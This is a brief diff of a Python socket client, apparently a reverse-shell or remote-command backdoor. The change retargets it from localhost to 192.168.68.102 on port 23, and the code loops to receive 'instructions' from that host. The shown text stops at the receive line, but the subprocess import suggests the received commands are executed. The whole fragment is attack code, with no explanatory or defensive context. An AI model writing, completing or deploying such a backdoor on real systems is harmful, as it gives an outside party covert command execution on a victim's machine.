@@ -1,11 +1,11 @@
 import socket, subprocess
 
- 
+
 s = socket.socket()         
  
-port = 10               
-
-s.connect(('127.0.0.1', port)) 
+port = 23               
+hostip = "192.168.68.102"
+s.connect((hostip, port)) 
 
 while True:
     instruction = s.recv(1024).decode()
